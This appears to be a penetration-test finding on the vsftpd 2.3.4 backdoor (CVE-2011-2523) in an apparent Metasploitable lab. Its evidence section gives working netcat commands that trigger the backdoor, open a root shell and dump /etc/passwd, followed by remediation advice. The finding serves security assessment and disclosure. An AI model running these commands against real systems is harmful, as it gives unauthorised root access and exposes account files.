title: Root Shell via vsftpd 2.3.4 Backdoor (CVE-2011-2523)
description: vsftpd 2.3.4 contains a backdoor that opens a root shell on port 6200 when a username ending with ':)' is used during FTP login. This is a known supply-chain compromise of the vsftpd source code. Successful exploitation provides uid=0(root) access.
evidence:
Exploitation steps:
1. Trigger backdoor: (echo 'USER backdoored:)'; sleep 2; echo 'PASS anything'; sleep 3) | nc -w 5 192.168.0.140 21
2. Connect to backdoor shell: echo 'id && whoami && cat /etc/passwd' | nc -w 5 192.168.0.140 6200

Output:
uid=0(root) gid=0(root)
root
metasploitable
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
[...full /etc/passwd dumped with 35+ accounts...]
remediation: Immediately upgrade vsftpd to a version not affected by the backdoor (2.3.5+). Verify the integrity of all installed software packages. Consider replacing with a secure FTP alternative or using SFTP.
